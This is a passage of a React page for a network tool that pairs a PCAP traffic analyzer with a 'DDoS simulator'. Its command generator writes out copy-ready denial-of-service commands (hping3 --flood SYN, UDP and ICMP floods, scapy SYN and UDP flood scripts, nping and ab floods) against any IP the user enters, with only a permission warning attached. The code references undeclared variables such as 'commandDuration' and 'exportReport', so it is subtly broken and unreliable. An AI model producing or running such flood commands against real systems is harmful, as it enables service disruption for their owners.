'use client'

import { useState } from 'react'
import Link from 'next/link'
import { Home, Upload, Zap, Activity, AlertTriangle, CheckCircle, XCircle, Download, BarChart3, Network, Flame, FileText, FileJson, Table, Copy, Check } from 'lucide-react'

export default function DDoSAnalysisPage() {
  const [activeTab, setActiveTab] = useState<'pcap' | 'simulator'>('pcap')
  const [pcapFile, setPcapFile] = useState<File | null>(null)
  const [pcapAnalysis, setPcapAnalysis] = useState<any>(null)
  const [loading, setLoading] = useState(false)
  
  const [simulatorType, setSimulatorType] = useState<'volumetric' | 'application'>('volumetric')
  const [targetUrl, setTargetUrl] = useState('')
  const [attackDuration, setAttackDuration] = useState('60')
  const [requestRate, setRequestRate] = useState('1000')
  const [simulationRunning, setSimulationRunning] = useState(false)
  const [simulationResults, setSimulationResults] = useState<any>(null)

  // Command Line Generator States
  const [commandProtocol, setCommandProtocol] = useState<'UDP' | 'TCP' | 'ICMP' | 'HTTP' | 'DNS'>('UDP')
  const [commandAttackType, setCommandAttackType] = useState<'SYN' | 'UDP-Flood' | 'ICMP-Flood' | 'HTTP-Flood' | 'DNS-Amplification'>('SYN')
  const [commandTargetIP, setCommandTargetIP] = useState('')
  const [commandTargetPort, setCommandTargetPort] = useState('80')
  const [commandPacketSize, setCommandPacketSize] = useState('1024')
  const [commandRate, setCommandRate] = useState('1000')
  const [commandTool, setCommandTool] = useState<'hping3' | 'tcpdump' | 'scapy' | 'nping' | 'ab'>('hping3')
  const [generatedCommand, setGeneratedCommand] = useState('')
  const [commandCopied, setCommandCopied] = useState(false)

  const handlePcapUpload = async (e: React.ChangeEvent<HTMLInputElement>) => {
    const file = e.target.files?.[0]
    if (file) {
      setPcapFile(file)
      setLoading(true)
      
      try {
        const formData = new FormData()
        formData.append('file', file)
        
        const response = await fetch('/api/ddos-analysis/pcap', {
          method: 'POST',
          body: formData
        })
        
        if (response.ok) {
          const data = await response.json()
          setPcapAnalysis(data)
        } else {
          const errorText = await response.text()
          console.error('[v0] PCAP analysis failed:', response.status, errorText)
        }
      } catch (error) {
        console.error('[v0] Error analyzing PCAP:', error)
      } finally {
        setLoading(false)
      }
    }
  }

  const runSimulation = async () => {
    if (!targetUrl) return
    
    setSimulationRunning(true)
    
    try {
      const response = await fetch('/api/ddos-analysis/simulate', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          type: simulatorType,
          targetUrl,
          duration: parseInt(attackDuration),
          requestRate: parseInt(requestRate)
        })
      })
      
      if (response.ok) {
        const data = await response.json()
        setSimulationResults(data)
      }
    } catch (error) {
      console.error('Error running simulation:', error)
    } finally {
      setSimulationRunning(false)
    }
  }

  const generateCommand = () => {
    if (!commandTargetIP) return
    
    let command = ''
    
    switch (commandTool) {
      case 'hping3':
        if (commandAttackType === 'SYN') {
          command = `hping3 -S -p ${commandTargetPort} -i u${Math.round(1000000 / commandRate)} --flood ${commandTargetIP}`
        } else if (commandAttackType === 'UDP-Flood') {
          command = `hping3 -2 -p ${commandTargetPort} -d ${commandPacketSize} -i u${Math.round(1000000 / commandRate)} --flood ${commandTargetIP}`
        } else if (commandAttackType === 'ICMP-Flood') {
          command = `hping3 -1 -i u${Math.round(1000000 / commandRate)} --flood ${commandTargetIP}`
        }
        break
      
      case 'tcpdump':
        command = `tcpdump -i eth0 -w capture.pcap host ${commandTargetIP} and port ${commandTargetPort}`
        break
      
      case 'scapy':
        if (commandAttackType === 'SYN') {
          command = `python3 << 'EOF'
from scapy.all import IP, TCP, send
import random

target_ip = '${commandTargetIP}'
target_port = ${commandTargetPort}
packet_count = ${commandRate}

for i in range(packet_count):
    ip = IP(dst=target_ip)
    tcp = TCP(dport=target_port, flags='S', seq=random.randint(1, 10000))
    send(ip/tcp, verbose=0)
EOF`
        } else if (commandAttackType === 'UDP-Flood') {
          command = `python3 << 'EOF'
from scapy.all import IP, UDP, send
import random

target_ip = '${commandTargetIP}'
target_port = ${commandTargetPort}
packet_size = ${commandPacketSize}
packet_count = ${commandRate}

for i in range(packet_count):
    ip = IP(dst=target_ip)
    udp = UDP(dport=target_port)
    payload = bytes(random.randint(0, 255) for _ in range(packet_size))
    send(ip/udp/payload, verbose=0)
EOF`
        }
        break
      
      case 'nping':
        if (commandAttackType === 'SYN') {
          command = `nping --tcp -p ${commandTargetPort} --rate ${commandRate} -c ${parseInt(commandDuration || '60')} ${commandTargetIP}`
        } else if (commandAttackType === 'UDP-Flood') {
          command = `nping --udp -p ${commandTargetPort} --rate ${commandRate} -c ${parseInt(commandDuration || '60')} ${commandTargetIP}`
        } else if (commandAttackType === 'ICMP-Flood') {
          command = `nping --icmp --rate ${commandRate} -c ${parseInt(commandDuration || '60')} ${commandTargetIP}`
        }
        break
      
      case 'ab':
        command = `ab -n ${commandRate * parseInt(commandDuration || '60')} -c ${commandRate / 10} http://${commandTargetIP}:${commandTargetPort}/`
        break
    }
    
    setGeneratedCommand(command)
  }

  const copyCommand = () => {
    if (generatedCommand) {
      navigator.clipboard.writeText(generatedCommand)
      setCommandCopied(true)
      setTimeout(() => setCommandCopied(false), 2000)
    }
  }

  return (
    <div className="min-h-screen bg-background text-foreground font-mono">
      {/* Background Grid */}
      <div className="fixed inset-0 pointer-events-none opacity-5">
        <div style={{
          backgroundImage: 'linear-gradient(0deg, transparent 24%, rgba(16, 255, 0, 0.05) 25%, rgba(16, 255, 0, 0.05) 26%, transparent 27%, transparent 74%, rgba(16, 255, 0, 0.05) 75%, rgba(16, 255, 0, 0.05) 76%, transparent 77%, transparent), linear-gradient(90deg, transparent 24%, rgba(16, 255, 0, 0.05) 25%, rgba(16, 255, 0, 0.05) 26%, transparent 27%, transparent 74%, rgba(16, 255, 0, 0.05) 75%, rgba(16, 255, 0, 0.05) 76%, transparent 77%, transparent)',
          backgroundSize: '50px 50px'
        }} className="absolute inset-0"></div>
      </div>

      {/* Header */}
      <header className="fixed top-0 left-0 right-0 bg-background/98 backdrop-blur-md border-b border-primary/40 px-6 py-4 z-50">
        <div className="max-w-7xl mx-auto flex items-center justify-between">
          <div className="flex items-center gap-3">
            <Link href="/" className="flex items-center gap-3 hover:opacity-80 transition-opacity">
              <div className="relative w-10 h-10 rounded-sm border-2 border-primary flex items-center justify-center">
                <Network className="w-5 h-5 text-primary" />
              </div>
              <div>
                <h1 className="text-lg font-bold text-primary tracking-[0.15em]">PCAP ANALYSIS</h1>
                <p className="text-xs text-primary/60">Network Traffic Analysis & Attack Simulation</p>
              </div>
            </Link>
          </div>
          <Link href="/">
            <button className="px-4 py-2 border border-primary/40 text-primary hover:bg-primary/10 rounded text-xs font-bold transition-all">
              <Home className="w-4 h-4 inline mr-1" />
              HOME
            </button>
          </Link>
        </div>
      </header>

      {/* Main Content */}
      <div className="pt-28 pb-12 px-6">
        <div className="max-w-7xl mx-auto space-y-8">
          {/* Tab Navigation */}
          <div className="flex gap-4 border-b border-primary/30">
            <button
              onClick={() => setActiveTab('pcap')}
              className={`px-6 py-3 font-bold text-sm transition-all ${
                activeTab === 'pcap'
                  ? 'text-primary border-b-2 border-primary bg-primary/5'
                  : 'text-primary/60 hover:text-primary'
              }`}
            >
              <Upload className="w-4 h-4 inline mr-2" />
              PCAP ANALYZER
            </button>
            <button
              onClick={() => setActiveTab('simulator')}
              className={`px-6 py-3 font-bold text-sm transition-all ${
                activeTab === 'simulator'
                  ? 'text-primary border-b-2 border-primary bg-primary/5'
                  : 'text-primary/60 hover:text-primary'
              }`}
            >
              <Zap className="w-4 h-4 inline mr-2" />
              DDoS SIMULATOR
            </button>
          </div>

          {/* PCAP Analyzer Tab */}
          {activeTab === 'pcap' && (
            <div className="space-y-8">
              {/* Upload Section */}
              <div className="cyber-card p-8 rounded-lg border border-primary/40">
                <h2 className="text-xl font-bold text-primary mb-6 flex items-center gap-2">
                  <Upload className="w-5 h-5" />
                  PCAP FILE ANALYSIS
                </h2>
                
                <div className="space-y-4">
                  <div className="border-2 border-dashed border-primary/40 rounded-lg p-8 hover:border-primary/70 transition-all cursor-pointer">
                    <input
                      type="file"
                      accept=".pcap,.pcapng,.cap"
                      onChange={handlePcapUpload}
                      className="hidden"
                      id="pcap-input"
                    />
                    <label htmlFor="pcap-input" className="flex flex-col items-center justify-center gap-3 cursor-pointer">
                      <Upload className="w-8 h-8 text-primary" />
                      <div className="text-center">
                        <p className="text-sm font-bold text-primary">Click to upload or drag and drop</p>
                        <p className="text-xs text-primary/60">PCAP, PCAPNG, or CAP files</p>
                      </div>
                    </label>
                  </div>
                  
                  {pcapFile && (
                    <div className="bg-green-500/10 p-4 rounded border border-green-500/30">
                      <p className="text-xs text-green-400">
                        File loaded: {pcapFile.name} ({(pcapFile.size / 1024).toFixed(2)} KB)
                      </p>
                    </div>
                  )}

                  {loading && (
                    <div className="flex items-center justify-center py-8">
                      <div className="animate-spin">
                        <Flame className="w-6 h-6 text-primary" />
                      </div>
                      <p className="text-primary ml-3 font-bold">ANALYZING PCAP FILE...</p>
                    </div>
                  )}

                  {pcapAnalysis && (
                    <div className="space-y-6">
                      {/* Overall Metrics */}
                      <div className="grid grid-cols-1 md:grid-cols-5 gap-4">
                        <div className="cyber-card p-6 rounded-lg border border-primary/40 bg-blue-500/5">
                          <p className="text-xs text-primary/60 mb-2">TOTAL PACKETS</p>
                          <p className="text-2xl font-bold text-blue-400">{pcapAnalysis.overallMetrics?.totalPackets || 0}</p>
                        </div>
                        <div className="cyber-card p-6 rounded-lg border border-primary/40 bg-orange-500/5">
                          <p className="text-xs text-primary/60 mb-2">SUSPICIOUS FLOWS</p>
                          <p className="text-2xl font-bold text-orange-400">{pcapAnalysis.overallMetrics?.suspiciousFlows || 0}</p>
                        </div>
                        <div className="cyber-card p-6 rounded-lg border border-primary/40 bg-red-500/5">
                          <p className="text-xs text-primary/60 mb-2">DDoS CONFIDENCE</p>
                          <p className="text-2xl font-bold text-red-400">{pcapAnalysis.overallMetrics?.ddosConfidence || 0}%</p>
                        </div>
                        <div className="cyber-card p-6 rounded-lg border border-primary/40 bg-purple-500/5">
                          <p className="text-xs text-primary/60 mb-2">ATTACK TYPE</p>
                          <p className="text-sm font-bold text-purple-400">{pcapAnalysis.overallMetrics?.attackType || 'UNKNOWN'}</p>
                        </div>
                        <div className="cyber-card p-6 rounded-lg border border-red-500/40 bg-red-500/5">
                          <p className="text-xs text-primary/60 mb-2">RISK LEVEL</p>
                          <p className="text-sm font-bold text-red-400">{pcapAnalysis.overallMetrics?.riskLevel || 'UNKNOWN'}</p>
                        </div>
                      </div>

                      {/* WAF Analysis Section */}
                      {pcapAnalysis.wafAnalysis && (
                        <div className="cyber-card p-6 rounded-lg border border-purple-500/40 bg-purple-500/5">
                          <h3 className="text-lg font-bold text-purple-400 mb-4">WAF ATTACK DETECTION</h3>
                          {pcapAnalysis.wafAnalysis.detected ? (
                            <div className="space-y-4">
                              <div className="p-4 bg-red-500/10 border border-red-500/30 rounded">
                                <p className="text-red-400 font-bold text-sm">{pcapAnalysis.wafAnalysis.summary}</p>
                              </div>
                              <div className="space-y-2">
                                {pcapAnalysis.wafAnalysis.detections.map((detection: any, idx: number) => (
                                  <div key={idx} className="p-3 bg-secondary/30 rounded border border-primary/20">
                                    <div className="flex justify-between items-start mb-2">
                                      <div>
                                        <p className="font-bold text-primary">{detection.type}</p>
                                        <p className="text-xs text-primary/60">Found in {detection.count} packets</p>
                                      </div>
                                      <span className={`text-xs font-bold px-3 py-1 rounded whitespace-nowrap ${
                                        detection.severity === 'CRITICAL' ? 'bg-red-500/30 text-red-400' :
                                        detection.severity === 'HIGH' ? 'bg-orange-500/30 text-orange-400' :
                                        'bg-yellow-500/30 text-yellow-400'
                                      }`}>
                                        {detection.severity}
                                      </span>
                                    </div>
                                    <div className="w-full bg-secondary/50 rounded-full h-1 overflow-hidden">
                                      <div 
                                        className={`h-full rounded-full ${
                                          detection.severity === 'CRITICAL' ? 'bg-red-500' :
                                          detection.severity === 'HIGH' ? 'bg-orange-500' :
                                          'bg-yellow-500'
                                        }`}
                                        style={{ width: `${Math.min(100, parseFloat(detection.percentage) * 10)}%` }}
                                      />
                                    </div>
                                  </div>
                                ))}
                              </div>
                            </div>
                          ) : (
                            <div className="p-4 bg-green-500/10 rounded border border-green-500/30">
                              <p className="text-green-400 font-bold text-sm">No WAF-relevant attacks detected in this PCAP file</p>
                            </div>
                          )}
                        </div>
                      )}

                      {/* Protocol Breakdown */}
                      <div className="cyber-card p-6 rounded-lg border border-primary/40">
                        <h3 className="text-lg font-bold text-primary mb-4">PROTOCOL BREAKDOWN</h3>
                        <div className="space-y-3">
                          {pcapAnalysis.packetAnalysis?.protocolBreakdown && Object.entries(pcapAnalysis.packetAnalysis.protocolBreakdown).map(([protocol, data]: any) => (
                            <div key={protocol} className="p-4 bg-secondary/30 rounded border border-primary/20">
                              <div className="flex justify-between items-center mb-2">
                                <p className="font-bold text-primary">{protocol}</p>
                                <span className="text-xs text-primary/60">{data.count} packets ({data.percentage}%)</span>
                              </div>
                              <div className="w-full bg-secondary/50 rounded-full h-2 overflow-hidden">
                                <div 
                                  className="h-full bg-gradient-to-r from-primary to-primary/60 rounded-full"
                                  style={{ width: `${data.percentage}%` }}
                                />
                              </div>
                              <p className="text-xs text-orange-400 mt-2">Suspicious: {data.suspicious} packets</p>
                            </div>
                          ))}
                        </div>
                      </div>

                      {/* Top Attacking Sources */}
                      <div className="cyber-card p-6 rounded-lg border border-primary/40">
                        <h3 className="text-lg font-bold text-primary mb-4">TOP ATTACKING SOURCES</h3>
                        <div className="overflow-x-auto">
                          <table className="w-full text-xs">
                            <thead>
                              <tr className="border-b border-primary/20">
                                <th className="text-left py-2 px-3 text-primary/60">SOURCE IP</th>
                                <th className="text-left py-2 px-3 text-primary/60">PACKETS</th>
                                <th className="text-left py-2 px-3 text-primary/60">BYTES</th>
                                <th className="text-left py-2 px-3 text-primary/60">PORTS</th>
                                <th className="text-left py-2 px-3 text-primary/60">ATTACK TYPE</th>
                              </tr>
                            </thead>
                            <tbody>
                              {pcapAnalysis.packetAnalysis?.trafficFlows?.topAttackingSources?.map((source: any, idx: number) => (
                                <tr key={idx} className="border-b border-primary/10 hover:bg-primary/5">
                                  <td className="py-2 px-3 font-mono text-red-400">{source.ip}</td>
                                  <td className="py-2 px-3 text-primary">{source.packets}</td>
                                  <td className="py-2 px-3 text-primary">{source.bytes}</td>
                                  <td className="py-2 px-3 text-primary">{source.ports?.join(', ')}</td>
                                  <td className="py-2 px-3 text-orange-400">{source.type}</td>
                                </tr>
                              ))}
                            </tbody>
                          </table>
                        </div>
                      </div>

                      {/* Target Servers */}
                      <div className="cyber-card p-6 rounded-lg border border-primary/40">
                        <h3 className="text-lg font-bold text-primary mb-4">TARGET SERVERS</h3>
                        {pcapAnalysis.packetAnalysis?.trafficFlows?.targetServers && pcapAnalysis.packetAnalysis?.trafficFlows?.targetServers.length > 0 ? (
                          <div className="overflow-x-auto">
                            <table className="w-full text-xs">
                              <thead>
                                <tr className="border-b border-primary/20">
                                  <th className="text-left py-2 px-3 text-primary/60">TARGET IP:PORT</th>
                                  <th className="text-left py-2 px-3 text-primary/60">PACKETS</th>
                                  <th className="text-left py-2 px-3 text-primary/60">BYTES</th>
                                  <th className="text-left py-2 px-3 text-primary/60">PROTOCOL</th>
                                  <th className="text-left py-2 px-3 text-primary/60">SEVERITY</th>
                                </tr>
                              </thead>
                              <tbody>
                                {pcapAnalysis.packetAnalysis?.trafficFlows?.targetServers?.map((target: any, idx: number) => (
                                  <tr key={idx} className="border-b border-primary/10 hover:bg-primary/5">
                                    <td className="py-2 px-3 font-mono text-blue-400">{target.ip}</td>
                                    <td className="py-2 px-3 text-primary">{target.packets}</td>
                                    <td className="py-2 px-3 text-primary">{target.bytes}</td>
                                    <td className="py-2 px-3 text-primary">{target.protocol}</td>
                                    <td className="py-2 px-3">
                                      <span className={`text-xs font-bold px-2 py-1 rounded ${
                                        target.severity === 'CRITICAL' ? 'bg-red-500/30 text-red-400' : 'bg-orange-500/30 text-orange-400'
                                      }`}>
                                        {target.severity}
                                      </span>
                                    </td>
                                  </tr>
                                ))}
                              </tbody>
                            </table>
                          </div>
                        ) : (
                          <div className="p-4 bg-blue-500/10 rounded border border-blue-500/30">
                            <p className="text-blue-400 font-bold">NO TARGET SERVERS DETECTED</p>
                            <p className="text-xs text-primary/60 mt-2">The PCAP file does not contain sufficient traffic data or destination IP information for analysis.</p>
                          </div>
                        )}
                      </div>

                      {/* Suspicious Payloads */}
                      <div className="cyber-card p-6 rounded-lg border border-primary/40 bg-primary/5">
                        <h3 className="text-lg font-bold text-primary mb-4">PAYLOAD ANALYSIS</h3>
                        <div className="space-y-4">
                          {pcapAnalysis.packetAnalysis?.payloadAnalysis?.suspiciousPayloads && 
                           pcapAnalysis.packetAnalysis?.payloadAnalysis?.suspiciousPayloads.length > 0 ? (
                            pcapAnalysis.packetAnalysis?.payloadAnalysis?.suspiciousPayloads?.map((payload: any, idx: number) => (
                              <div key={idx} className="p-4 bg-red-500/10 rounded border border-red-500/30">
                                <div className="flex justify-between items-start mb-2">
                                  <div>
                                    <p className="font-bold text-red-400">{payload.type}</p>
                                    <p className="text-xs text-primary/60 mt-1">{payload.description}</p>
                                  </div>
                                  <span className={`text-xs font-bold px-2 py-1 rounded ${
                                    payload.severity === 'CRITICAL' ? 'bg-red-500/30 text-red-400' : 'bg-orange-500/30 text-orange-400'
                                  }`}>
                                    {payload.severity}
                                  </span>
                                </div>
                                <div className="mt-3 space-y-1 text-xs text-primary/60">
                                  <p><span className="font-bold text-primary">Occurrences:</span> {payload.occurrences}</p>
                                  <p><span className="font-bold text-primary">Source IPs:</span> {payload.sources?.join(', ')}</p>
                                  <p><span className="font-bold text-primary">Target Ports:</span> {payload.destinationPorts?.join(', ')}</p>
                                </div>
                              </div>
                            ))
                          ) : (
                            <div className="p-4 bg-green-500/10 rounded border border-green-500/30">
                              <div className="flex items-center gap-2">
                                <CheckCircle className="w-5 h-5 text-green-400" />
                                <p className="font-bold text-green-400">NO SUSPICIOUS PAYLOADS DETECTED</p>
                              </div>
                              <p className="text-xs text-primary/60 mt-2">The analyzed traffic did not contain identifiable malicious payload signatures.</p>
                            </div>
                          )}
                        </div>
                      </div>

                      {/* Mitigation Strategies */}
                      <div className="cyber-card p-6 rounded-lg border border-green-500/40 bg-green-500/5">
                        <h3 className="text-lg font-bold text-green-400 mb-4">MITIGATION STRATEGIES</h3>
                        <div className="space-y-3">
                          {pcapAnalysis.mitigationStrategies?.map((strategy: any, idx: number) => (
                            <div key={idx} className="p-4 bg-secondary/30 rounded border border-green-500/30">
                              <div className="flex justify-between items-start mb-2">
                                <p className="font-bold text-primary">{strategy.strategy}</p>
                                <span className={`text-xs font-bold px-2 py-1 rounded ${
                                  strategy.priority === 'CRITICAL' ? 'bg-red-500/30 text-red-400' : 'bg-yellow-500/30 text-yellow-400'
                                }`}>
                                  {strategy.priority}
                                </span>
                              </div>
                              <p className="text-xs text-primary/60 mb-2">{strategy.implementation}</p>
                              <p className="text-xs text-green-400">Impact: {strategy.impact}</p>
                            </div>
                          ))}
                        </div>
                      </div>

                      {/* Export Buttons */}
                      <div className="flex flex-wrap gap-3 border-t border-primary/20 pt-6">
                        <button
                          onClick={() => exportReport(pcapAnalysis, 'html')}
                          className="flex items-center gap-2 px-4 py-2 bg-blue-500/20 text-blue-400 hover:bg-blue-500/40 rounded font-bold text-xs transition-all border border-blue-500/30"
                        >
                          <FileText className="w-4 h-4" />
                          EXPORT HTML
                        </button>
                        <button
                          onClick={() => exportReport(pcapAnalysis, 'json')}
                          className="flex items-center gap-2 px-4 py-2 bg-green-500/20 text-green-400 hover:bg-green-500/40 rounded font-bold text-xs transition-all border border-green-500/30"
                        >
                          <FileJson className="w-4 h-4" />
                          EXPORT JSON
                        </button>
                        <button
                          onClick={() => exportReport(pcapAnalysis, 'csv')}
                          className="flex items-center gap-2 px-4 py-2 bg-purple-500/20 text-purple-400 hover:bg-purple-500/40 rounded font-bold text-xs transition-all border border-purple-500/30"
                        >
                          <Table className="w-4 h-4" />
                          EXPORT CSV
                        </button>
                      </div>
                    </div>
                  )}
                </div>
              </div>
            </div>
          )}

          {/* DDoS Simulator Tab */}
          {activeTab === 'simulator' && (
            <div className="space-y-8">
              <div className="cyber-card p-8 rounded-lg border border-primary/40">
                <h2 className="text-xl font-bold text-primary mb-6 flex items-center gap-2">
                  <Zap className="w-5 h-5" />
                  DDoS ATTACK SIMULATOR
                </h2>

                <div className="space-y-6">
                  {/* Attack Type Selection */}
                  <div>
                    <p className="text-sm font-bold text-primary mb-3">ATTACK TYPE</p>
                    <div className="grid grid-cols-2 gap-4">
                      <button
                        onClick={() => setSimulatorType('volumetric')}
                        className={`p-4 rounded border-2 transition-all text-left ${
                          simulatorType === 'volumetric'
                            ? 'border-primary bg-primary/10'
                            : 'border-primary/40 hover:border-primary/70'
                        }`}
                      >
                        <p className="font-bold text-primary">VOLUMETRIC ATTACK</p>
                        <p className="text-xs text-primary/60 mt-1">Floods target with massive traffic</p>
                      </button>
                      <button
                        onClick={() => setSimulatorType('application')}
                        className={`p-4 rounded border-2 transition-all text-left ${
                          simulatorType === 'application'
                            ? 'border-primary bg-primary/10'
                            : 'border-primary/40 hover:border-primary/70'
                        }`}
                      >
                        <p className="font-bold text-primary">APPLICATION ATTACK</p>
                        <p className="text-xs text-primary/60 mt-1">Exploits application layer</p>
                      </button>
                    </div>
                  </div>

                  {/* Target URL */}
                  <div>
                    <label className="text-sm font-bold text-primary mb-2 block">TARGET URL (SIMULATION ONLY)</label>
                    <input
                      type="text"
                      value={targetUrl}
                      onChange={(e) => setTargetUrl(e.target.value)}
                      placeholder="https://example.com"
                      className="w-full px-4 py-3 bg-secondary/30 border border-primary/30 rounded text-primary placeholder:text-primary/40 focus:outline-none focus:border-primary"
                    />
                    <p className="text-xs text-primary/60 mt-2">No actual traffic will be sent - for analysis only</p>
                  </div>

                  {/* Parameters */}
                  <div className="grid grid-cols-2 gap-4">
                    <div>
                      <label className="text-sm font-bold text-primary mb-2 block">DURATION (seconds)</label>
                      <input
                        type="number"
                        value={attackDuration}
                        onChange={(e) => setAttackDuration(e.target.value)}
                        min="1"
                        max="300"
                        className="w-full px-4 py-3 bg-secondary/30 border border-primary/30 rounded text-primary focus:outline-none focus:border-primary"
                      />
                    </div>
                    <div>
                      <label className="text-sm font-bold text-primary mb-2 block">REQUEST RATE (req/sec)</label>
                      <input
                        type="number"
                        value={requestRate}
                        onChange={(e) => setRequestRate(e.target.value)}
                        min="100"
                        max="100000"
                        step="100"
                        className="w-full px-4 py-3 bg-secondary/30 border border-primary/30 rounded text-primary focus:outline-none focus:border-primary"
                      />
                    </div>
                  </div>

                  <button
                    onClick={runSimulation}
                    disabled={simulationRunning || !targetUrl}
                    className="w-full px-6 py-3 bg-red-500/20 border border-red-500/40 text-red-400 hover:bg-red-500/40 disabled:opacity-50 rounded font-bold transition-all"
                  >
                    {simulationRunning ? (
                      <>
                        <Flame className="w-4 h-4 inline mr-2 animate-pulse" />
                        SIMULATING ATTACK...
                      </>
                    ) : (
                      <>
                        <Flame className="w-4 h-4 inline mr-2" />
                        RUN SIMULATION
                      </>
                    )}
                  </button>

                  {/* Divider */}
                  <div className="border-t border-primary/20 pt-6 mt-6">
                    <h3 className="text-lg font-bold text-primary mb-6 flex items-center gap-2">
                      <FileText className="w-5 h-5" />
                      COMMAND LINE GENERATOR
                    </h3>

                    {/* Tool Selection */}
                    <div className="space-y-4">
                      <div>
                        <p className="text-sm font-bold text-primary mb-3">TOOL</p>
                        <div className="grid grid-cols-5 gap-2">
                          {(['hping3', 'tcpdump', 'scapy', 'nping', 'ab'] as const).map((tool) => (
                            <button
                              key={tool}
                              onClick={() => setCommandTool(tool)}
                              className={`px-3 py-2 rounded border text-xs font-bold transition-all ${
                                commandTool === tool
                                  ? 'border-primary bg-primary/10 text-primary'
                                  : 'border-primary/30 text-primary/60 hover:border-primary/70'
                              }`}
                            >
                              {tool.toUpperCase()}
                            </button>
                          ))}
                        </div>
                      </div>

                      {/* Protocol Selection */}
                      <div>
                        <p className="text-sm font-bold text-primary mb-3">PROTOCOL</p>
                        <div className="grid grid-cols-5 gap-2">
                          {(['UDP', 'TCP', 'ICMP', 'HTTP', 'DNS'] as const).map((proto) => (
                            <button
                              key={proto}
                              onClick={() => setCommandProtocol(proto)}
                              className={`px-3 py-2 rounded border text-xs font-bold transition-all ${
                                commandProtocol === proto
                                  ? 'border-primary bg-primary/10 text-primary'
                                  : 'border-primary/30 text-primary/60 hover:border-primary/70'
                              }`}
                            >
                              {proto}
                            </button>
                          ))}
                        </div>
                      </div>

                      {/* Attack Type Selection */}
                      <div>
                        <p className="text-sm font-bold text-primary mb-3">ATTACK TYPE</p>
                        <div className="grid grid-cols-5 gap-2">
                          {(['SYN', 'UDP-Flood', 'ICMP-Flood', 'HTTP-Flood', 'DNS-Amplification'] as const).map((type) => (
                            <button
                              key={type}
                              onClick={() => setCommandAttackType(type)}
                              className={`px-3 py-2 rounded border text-xs font-bold transition-all ${
                                commandAttackType === type
                                  ? 'border-primary bg-primary/10 text-primary'
                                  : 'border-primary/30 text-primary/60 hover:border-primary/70'
                              }`}
                            >
                              {type}
                            </button>
                          ))}
                        </div>
                      </div>

                      {/* Command Parameters */}
                      <div className="grid grid-cols-2 md:grid-cols-4 gap-4 bg-secondary/20 p-4 rounded border border-primary/20">
                        <div>
                          <label className="text-xs font-bold text-primary/60 mb-2 block">TARGET IP</label>
                          <input
                            type="text"
                            value={commandTargetIP}
                            onChange={(e) => setCommandTargetIP(e.target.value)}
                            placeholder="192.168.1.1"
                            className="w-full px-3 py-2 bg-secondary/30 border border-primary/30 rounded text-primary placeholder:text-primary/40 focus:outline-none focus:border-primary text-xs"
                          />
                        </div>
                        <div>
                          <label className="text-xs font-bold text-primary/60 mb-2 block">PORT</label>
                          <input
                            type="number"
                            value={commandTargetPort}
                            onChange={(e) => setCommandTargetPort(e.target.value)}
                            placeholder="80"
                            className="w-full px-3 py-2 bg-secondary/30 border border-primary/30 rounded text-primary placeholder:text-primary/40 focus:outline-none focus:border-primary text-xs"
                          />
                        </div>
                        <div>
                          <label className="text-xs font-bold text-primary/60 mb-2 block">PACKET SIZE</label>
                          <input
                            type="number"
                            value={commandPacketSize}
                            onChange={(e) => setCommandPacketSize(e.target.value)}
                            placeholder="1024"
                            className="w-full px-3 py-2 bg-secondary/30 border border-primary/30 rounded text-primary placeholder:text-primary/40 focus:outline-none focus:border-primary text-xs"
                          />
                        </div>
                        <div>
                          <label className="text-xs font-bold text-primary/60 mb-2 block">RATE (packets/sec)</label>
                          <input
                            type="number"
                            value={commandRate}
                            onChange={(e) => setCommandRate(e.target.value)}
                            placeholder="1000"
                            className="w-full px-3 py-2 bg-secondary/30 border border-primary/30 rounded text-primary placeholder:text-primary/40 focus:outline-none focus:border-primary text-xs"
                          />
                        </div>
                      </div>

                      <button
                        onClick={generateCommand}
                        className="w-full px-6 py-3 bg-blue-500/20 border border-blue-500/40 text-blue-400 hover:bg-blue-500/40 rounded font-bold transition-all text-sm"
                      >
                        <Zap className="w-4 h-4 inline mr-2" />
                        GENERATE COMMAND
                      </button>

                      {/* Generated Command Display */}
                      {generatedCommand && (
                        <div className="bg-secondary/30 border border-primary/30 rounded p-4 space-y-3">
                          <div className="flex items-center justify-between">
                            <p className="text-xs font-bold text-primary/60">GENERATED COMMAND:</p>
                            <button
                              onClick={copyCommand}
                              className="px-3 py-1 bg-green-500/20 border border-green-500/40 text-green-400 hover:bg-green-500/40 rounded text-xs font-bold transition-all flex items-center gap-2"
                            >
                              {commandCopied ? (
                                <>
                                  <Check className="w-3 h-3" />
                                  COPIED
                                </>
                              ) : (
                                <>
                                  <Copy className="w-3 h-3" />
                                  COPY
                                </>
                              )}
                            </button>
                          </div>
                          <div className="bg-black/30 p-3 rounded border border-primary/20 font-mono text-xs text-green-400 break-all whitespace-pre-wrap max-h-48 overflow-y-auto">
                            {generatedCommand}
                          </div>
                          <p className="text-xs text-orange-400/80">
                            <AlertTriangle className="w-3 h-3 inline mr-1" />
                            WARNING: Use this command only on systems you own or have explicit permission to test. Unauthorized testing is illegal.
                          </p>
                        </div>
                      )}
                    </div>
                  </div>
                </div>
              </div>

              {/* Simulation Results */}
              {simulationResults && (
                <div className="space-y-6">
                  <div className="grid grid-cols-1 md:grid-cols-4 gap-4">
                    <div className="cyber-card p-6 rounded-lg border border-primary/40 bg-blue-500/5">
                      <p className="text-xs text-primary/60 mb-2">TOTAL REQUESTS</p>
                      <p className="text-3xl font-bold text-blue-400">{simulationResults.totalRequests}</p>
                    </div>
                    <div className="cyber-card p-6 rounded-lg border border-primary/40 bg-orange-500/5">
                      <p className="text-xs text-primary/60 mb-2">AVG RESPONSE TIME</p>
                      <p className="text-3xl font-bold text-orange-400">{simulationResults.avgResponseTime}ms</p>
                    </div>
                    <div className="cyber-card p-6 rounded-lg border border-primary/40 bg-red-500/5">
                      <p className="text-xs text-primary/60 mb-2">ERROR RATE</p>
                      <p className="text-3xl font-bold text-red-400">{simulationResults.errorRate}%</p>
                    </div>
                    <div className="cyber-card p-6 rounded-lg border border-primary/40 bg-green-500/5">
                      <p className="text-xs text-primary/60 mb-2">SUCCESS RATE</p>
                      <p className="text-3xl font-bold text-green-400">{simulationResults.successRate}%</p>
                    </div>
                  </div>

                  <div className="cyber-card p-6 rounded-lg border border-primary/40">
                    <h3 className="text-lg font-bold text-primary mb-4">ATTACK EFFECTIVENESS</h3>
                    <div className="space-y-3">
                      <div>
                        <p className="text-xs text-primary/60 mb-2">CPU IMPACT</p>
                        <div className="w-full bg-secondary/30 rounded h-2 overflow-hidden">
